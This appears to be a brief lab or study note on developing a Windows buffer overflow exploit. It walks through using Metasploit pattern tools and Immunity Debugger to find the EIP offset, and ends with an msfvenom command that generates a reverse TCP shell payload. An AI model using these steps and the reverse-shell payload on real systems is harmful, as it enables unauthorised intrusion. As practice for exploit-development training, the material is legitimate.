Metasploit framework can be used to find the exact number of characters of crash points. 
I used "pattern_create.rb" tool. 
                    ./pattern_create.rb -l 3000
                    
After pattern created, we should change our code from fuzzing.py to offset.py. Then we crash the server by offset.py so EIP can be obtained from Immunity Debugger. 
Next, I used 'pattern_offset.rb' tools:
                    ./pattern_offset.rb -l 3000 -q <EID>
Hence, I got the exact match at ofset.

NOTE1: 
    ./nasm_shell.rb tool helps you to convert assembly (JMP ESP) to hex format
NOTE2: 
    mona should be download to the immunity debugger 
NOTE3: 
    msfvenom was used to create shell script to connect server to us. Code is like the below:

      msfvenom -p windows/shell_reverse_tcp LHOST=<Host IP> LPORT=<port number:4444> EXITFUNC=thread -f c -a x86 -b "\x00"
